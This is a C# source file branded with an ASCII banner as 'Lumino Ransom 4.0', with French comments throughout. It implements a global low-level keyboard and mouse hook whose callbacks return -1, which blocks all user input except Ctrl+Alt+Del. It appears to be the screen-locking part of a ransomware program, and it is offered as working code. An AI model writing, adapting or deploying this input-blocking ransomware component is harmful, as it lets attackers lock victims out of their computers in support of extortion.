/*





L)        U)    uu   M)mm mmm   I)iiii  N)n   nn   O)oooo        R)rrrrr     A)aa    N)n   nn   S)ssss    O)oooo    M)mm mmm  
L)        U)    uu  M)  mm  mm    I)    N)nn  nn  O)    oo       R)    rr   A)  aa   N)nn  nn  S)    ss  O)    oo  M)  mm  mm 
L)        U)    uu  M)  mm  mm    I)    N) nn nn  O)    oo       R)  rrr   A)    aa  N) nn nn   S)ss     O)    oo  M)  mm  mm 
L)        U)    uu  M)  mm  mm    I)    N)  nnnn  O)    oo       R) rr     A)aaaaaa  N)  nnnn       S)   O)    oo  M)  mm  mm 
L)        U)    uu  M)      mm    I)    N)   nnn  O)    oo       R)   rr   A)    aa  N)   nnn  S)    ss  O)    oo  M)      mm 
L)llllll   U)uuuu   M)      mm  I)iiii  N)    nn   O)oooo        R)    rr  A)    aa  N)    nn   S)ssss    O)oooo   M)      mm 
                                                                                                                    
     __ __             __     
    /\ \\ \          /'__`\   
    \ \ \\ \        /\ \/\ \  
     \ \ \\ \_      \ \ \ \ \ 
      \ \__ ,__\ __  \ \ \_\ \
       \/_/\_\_//\_\  \ \____/
          \/_/  \/_/   \/___/ 
              




*/
using System;                           /*\|---------------------------------------------------------------------------------------------------------------|\*/
using System.Runtime.InteropServices;   /*\|   Librairie de base (System) et Librairie pour les appels Win32 (Runtime.InteropServices) et Librairie pour   |\*/
using System.Reflection;                /*\|                            les appels à des fonctions externes (Reflection)                                   |\*/
/*                                      /*\| INFO: un hook sert à bloquer la souris/clavier de l'utilisateur (sauf ctrl+alt+sup: intercepeter par Windows) |\*/
/*                                      /*\|---------------------------------------------------------------------------------------------------------------|\*/


// namespace GlobalHook
namespace GlobalHook
{
    // class UserActivityHook
    public class UserActivityHook
    {
        private int _hMouseHook = 0;                                                                                                       // nouvelle variable (privée) pour le hook de la souris
        private int _hKeyboardHook = 0;                                                                                                    // nouvelle variable (privée) pour le hook du clavier
        private static HookProc MouseHookProcedure = null;                                                                                 // initialisation de la variable MouseHookProcedure qui permet de définir le hook de la souris à l'aide de la fonction HookProc
        private static HookProc KeyboardHookProcedure = null;                                                                              // initialisation de la variable KeyboardHookProcedure qui permet de définir le hook du clavier à l'aide de la fonction HookProc

        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall, SetLastError = true)]              // appel de la fonction SetWindowsHookEx de la librairie user32.dll pour définir le hook de la souris (WH_MOUSE_LL) ou du clavier (WH_KEYBOARD_LL) pour activer le hook
        private static extern int SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, int dwThreadId);                                // déclaration de la fonction SetWindowsHookEx avec des paramètres de type int, HookProc, IntPtr et int


        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall, SetLastError = true)]              // appel de la fonction UnhookWindowsHookEx de la librairie user32.dll pour désactiver le hook de la souris (WH_MOUSE_LL) ou du clavier (WH_KEYBOARD_LL) pour désactiver le hook
        private static extern int UnhookWindowsHookEx(int idHook);                                                                         // déclaration de la fonction UnhookWindowsHookEx avec un paramètre de type int

        private delegate int HookProc(int nCode, int wParam, IntPtr lParam);                                                               // déclaration de la fonction HookProc avec des paramètres de type int, int et IntPtr


        private const int WH_MOUSE_LL = 14;                                                                                                // déclaration de la constante WH_MOUSE_LL avec une valeur de type int (14)

        private const int WH_KEYBOARD_LL = 13;                                                                                             // déclaration de la constante WH_KEYBOARD_LL avec une valeur de type int (13)


        public void Start_key()  // Fonction qui permet de démarrer le hook du clavier
        {
            KeyboardHookProcedure = new HookProc(KeyboardHookProc);                                                                                                       // déclaration de la variable KeyboardHookProcedure qui permet de définir le hook du clavier à l'aide de la fonction HookProc
            this._hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookProcedure, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]), 0);      // déclaration de la variable (this.)_hKeyboardHook qui permet de définir le hook du clavier à l'aide de la fonction SetWindowsHookEx
        }
        public void Start_mouse() // Fonction qui permet de démarrer le hook de la souris
        {
            MouseHookProcedure = new HookProc(MouseHookProc);                                                                                                             // déclaration de la variable MouseHookProcedure qui permet de définir le hook de la souris à l'aide de la fonction HookProc
            this._hMouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseHookProcedure, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]), 0);               // déclaration de la variable (this.)_hMouseHook qui permet de définir le hook de la souris à l'aide de la fonction SetWindowsHookEx
        }


        public void Stop_key() // Fonction qui permet d'arrêter le hook du clavier
        {
            this.Stop_key(true, true);                                                                                                                                     // appel de la fonction Stop_key avec les paramètres true et true
        }
        public void Stop_mouse() // Fonction qui permet d'arrêter le hook de la souris
        {
            this.Stop_mouse(true, true);                                                                                                                                   // appel de la fonction Stop_mouse avec les paramètres true et true
        }
        public void Stop_mouse(bool uninstallMouseHook, bool throwExceptions) // Fonction qui permet d'arrêter le hook de la souris
        {
            int retMouse = UnhookWindowsHookEx(this._hMouseHook);                                                                                                          // déclaration de la variable retMouse qui permet de désactiver le hook de la souris à l'aide de la fonction UnhookWindowsHookEx
            this._hMouseHook = 0;                                                                                                                                          // déclaration de la variable (this.)_hMouseHook avec une valeur de type int (0)

        }

        public void Stop_key(bool uninstallKeyboardHook, bool throwExceptions) // Fonction qui permet d'arrêter le hook du clavier
        {
            int retKeyboard = UnhookWindowsHookEx(this._hKeyboardHook);                                                                                                    // déclaration de la variable retKeyboard qui permet de désactiver le hook du clavier à l'aide de la fonction UnhookWindowsHookEx
            this._hKeyboardHook = 0;                                                                                                                                       // déclaration de la variable (this.)_hKeyboardHook avec une valeur de type int (0)
        }


        private int MouseHookProc(int nCode, int wParam, IntPtr lParam) // Fonction qui permet de définir le hook de la souris
        {
            return -1;                                                                                                                                                    // retourne -1
        }

        private int KeyboardHookProc(int nCode, Int32 wParam, IntPtr lParam) // Fonction qui permet de définir le hook du clavier
        {
            return -1;                                                                                                                                                    // retourne -1
        }
    }
}